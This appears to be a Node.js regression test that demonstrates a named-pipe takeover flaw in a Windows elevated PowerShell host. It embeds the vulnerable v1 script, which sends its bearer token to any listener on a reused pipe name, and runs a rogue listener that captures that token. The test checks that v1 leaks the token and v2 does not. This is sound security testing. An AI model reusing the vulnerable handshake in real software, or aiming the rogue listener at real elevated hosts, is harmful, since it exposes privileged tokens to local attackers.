/**
 * RED-before / GREEN-after evidence for the HIGH-severity finding.
 *
 * The finding: after revocation the daemon closed its socket, but the
 * high-integrity PowerShell host went back to its reconnect loop and retried
 * the same (enumerable, now-free) pipe name. Any local process that stood up a
 * listener under that name received the host's full bearer token in the hello
 * frame, and could then drive elevated operations.
 *
 * This script runs the SAME attack against both host versions:
 *   - v1 (the reviewed, blocked implementation, reconstructed verbatim below)
 *   - v2 (the current os-adapters/windows-host/elevated-host.ps1)
 *
 * Both hosts are launched at medium integrity -- no UAC prompt is needed,
 * because what is being demonstrated is the handshake, not the privilege.
 *
 *   node tests/live/pipe-takeover-v1-vs-v2.mjs
 *
 * Expected: v1 hands over its token (VULNERABLE), v2 discloses nothing (FIXED).
 */
import path from "node:path";
import os from "node:os";
import net from "node:net";
import fs from "node:fs/promises";
import crypto from "node:crypto";
import { spawn } from "node:child_process";
import { ELEVATED_HOST_SCRIPT, ELEVATED_OPERATION_SCHEMA_PATH }
  from "../../os-adapters/windows-host/src/elevated-client.js";

// The v1 connect/authenticate loop, reproduced exactly as it was reviewed.
const V1_SCRIPT = `param(
  [Parameter(Mandatory = $true)][string]$PipeName,
  [Parameter(Mandatory = $true)][string]$AuthToken,
  [Parameter(Mandatory = $true)][int]$LifetimeSeconds
)
$ErrorActionPreference = 'Stop'
$deadline = (Get-Date).AddSeconds($LifetimeSeconds)
function Test-Elevated {
  $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
  $principal = New-Object Security.Principal.WindowsPrincipal($identity)
  return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
while ((Get-Date) -lt $deadline) {
  $client = New-Object System.IO.Pipes.NamedPipeClientStream(
    '.', $PipeName, [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::Asynchronous)
  try {
    $client.Connect(5000)
    $reader = New-Object System.IO.StreamReader($client)
    $writer = New-Object System.IO.StreamWriter($client)
    $writer.AutoFlush = $true
    $hello = @{ hello = $AuthToken; pid = $PID; elevated = (Test-Elevated) }
    $writer.WriteLine((\$hello | ConvertTo-Json -Depth 4 -Compress))
    while ($client.IsConnected -and (Get-Date) -lt $deadline) {
      $line = $reader.ReadLine()
      if ($null -eq $line) { break }
    }
  } catch {
    Start-Sleep -Milliseconds 250
  } finally {
    try { $client.Dispose() } catch { }
  }
}
`.replace("\\$hello", "$hello");

const workDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "syscora-takeover-"));

/**
 * Stand up a rogue listener on `pipeName` and record everything a host sends.
 * This is the attacker: a same-user process that grabbed a freed pipe name.
 */
async function runAttack({ label, spawnHost, pipeName, waitMs = 6000 }) {
  const rogue = net.createServer((socket) => {
    rogue.connected = true;
    socket.on("data", (chunk) => { rogue.received = `${rogue.received ?? ""}${chunk}`; });
    socket.on("error", () => {});
  });
  rogue.connected = false;
  await new Promise((resolve, reject) => {
    rogue.once("error", reject);
    rogue.listen(`\\\\.\\pipe\\${pipeName}`, resolve);
  });

  const child = spawnHost();
  let stderr = "";
  child.stderr.on("data", (chunk) => { stderr = `${stderr}${chunk}`.slice(-2000); });
  child.stdout.resume();

  await new Promise((resolve) => setTimeout(resolve, waitMs));
  try { child.kill(); } catch { /* already gone */ }
  await new Promise((resolve) => rogue.close(resolve));

  return { label, connected: rogue.connected, received: rogue.received ?? null, stderr };
}

const results = [];

// ---------------------------------------------------------------- v1 (RED)
{
  const v1Path = path.join(workDirectory, "elevated-host-v1.ps1");
  await fs.writeFile(v1Path, V1_SCRIPT, "utf8");
  const pipeName = `syscora-elevated-${crypto.randomUUID()}`;
  const token = crypto.randomBytes(32).toString("hex");
  const result = await runAttack({
    label: "v1 (reviewed / blocked)",
    pipeName,
    spawnHost: () => spawn("powershell.exe", [
      "-NoLogo", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
      "-File", v1Path,
      "-PipeName", pipeName, "-AuthToken", token, "-LifetimeSeconds", "30"
    ], { stdio: ["ignore", "pipe", "pipe"], windowsHide: true })
  });
  result.token = token;
  result.tokenLeaked = Boolean(result.received && result.received.includes(token));
  results.push(result);
}

// ---------------------------------------------------------------- v2 (GREEN)
{
  const pipeName = `syscora-elevated-${crypto.randomUUID()}`;
  const secretFile = path.join(workDirectory, "v2.secret");
  const secret = crypto.randomBytes(32).toString("hex");
  await fs.writeFile(secretFile, secret, "utf8");
  // The attacker holds the pipe, but the host was launched expecting a
  // different daemon pid -- exactly the post-revoke takeover situation.
  const impostorPid = 4;
  const result = await runAttack({
    label: "v2 (current)",
    pipeName,
    spawnHost: () => spawn("powershell.exe", [
      "-NoLogo", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
      "-File", ELEVATED_HOST_SCRIPT,
      "-PipeName", pipeName,
      "-SecretFile", secretFile,
      "-DaemonPid", String(impostorPid),
      "-LifetimeSeconds", "30",
      "-SchemaFile", ELEVATED_OPERATION_SCHEMA_PATH
    ], { stdio: ["ignore", "pipe", "pipe"], windowsHide: true })
  });
  result.token = secret;
  result.tokenLeaked = Boolean(result.received && result.received.includes(secret));
  results.push(result);
}

console.log("=== PIPE TAKEOVER: v1 vs v2 ===\n");
for (const result of results) {
  console.log(`--- ${result.label} ---`);
  console.log(`rogue listener got a connection : ${result.connected}`);
  console.log(`bytes disclosed to the attacker : ${result.received ? JSON.stringify(result.received.trim()) : "none"}`);
  console.log(`session secret leaked           : ${result.tokenLeaked ? "YES  <-- VULNERABLE" : "no"}`);
  if (result.stderr.trim()) console.log(`host stderr                     : ${result.stderr.trim().slice(0, 300)}`);
  console.log("");
}

await fs.rm(workDirectory, { recursive: true, force: true });

const v1 = results[0];
const v2 = results[1];
const demonstrated = v1.tokenLeaked === true && v2.tokenLeaked === false && v2.received === null;
console.log(demonstrated
  ? "RESULT: the finding reproduces on v1 and is closed on v2."
  : "RESULT: INCONCLUSIVE - the attack did not behave as expected on one of the versions.");
process.exit(demonstrated ? 0 : 1);
